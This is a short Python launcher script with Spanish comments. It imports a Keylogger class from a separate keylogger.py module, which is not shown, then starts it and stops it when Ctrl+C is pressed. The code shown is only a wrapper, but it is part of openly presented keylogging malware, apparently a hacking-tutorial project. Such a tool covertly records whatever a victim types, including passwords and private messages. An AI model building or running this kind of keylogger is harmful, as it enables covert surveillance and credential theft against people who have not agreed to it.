#!/usr/bin/env python3

# Importación de la clase Keylogger desde el script keylogger.py
from keylogger import Keylogger
import signal  # Para manejar señales del sistema, como Ctrl+C
from termcolor import colored  # Para imprimir mensajes de salida en la terminal con colores
import sys  # Para interactuar con el sistema

# Función para manejar la señal de interrupción (Ctrl+C)
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    my_keylogger.shutdown()  # Detiene el keylogger
    sys.exit(1)  # Sale del script
    
# Establece la función def_handler como manejador de la señal SIGINT (interrupción)
signal.signal(signal.SIGINT, def_handler)

# Punto de entrada principal del script
if __name__ == '__main__':
    my_keylogger = Keylogger()  # Crea una instancia de la clase Keylogger
    my_keylogger.start()  # Inicia el keylogger

